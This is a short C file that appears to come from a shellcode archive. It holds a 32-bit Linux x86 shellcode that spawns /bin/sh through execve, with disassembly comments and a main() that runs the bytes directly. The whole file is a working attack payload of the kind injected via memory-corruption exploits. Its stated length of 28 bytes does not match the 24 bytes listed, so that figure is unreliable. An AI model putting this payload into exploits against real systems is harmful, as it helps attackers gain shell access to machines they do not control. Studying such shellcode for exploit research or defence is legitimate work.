/*
 * Title: Linux/x86 - execve("/bin/sh") Shellcode (28 bytes)
 * Author: Hassan Ali Abdullah
 * Contact: @fbow
 * Platform: Linux x86
 * Architecture: x86
 * Tested on: Ubuntu 20.04 (32-bit)
 * Shellcode Length: 28 bytes
 */

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] =
"\x31\xc0"              // xor    eax,eax
"\x50"                  // push   eax
"\x68\x2f\x2f\x73\x68"  // push   0x68732f2f
"\x68\x2f\x62\x69\x6e"  // push   0x6e69622f
"\x89\xe3"              // mov    ebx,esp
"\x50"                  // push   eax
"\x53"                  // push   ebx
"\x89\xe1"              // mov    ecx,esp
"\x99"                  // cdq
"\xb0\x0b"              // mov    al,0xb
"\xcd\x80";             // int    0x80

int main() {
    printf("Shellcode Length: %lu bytes\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
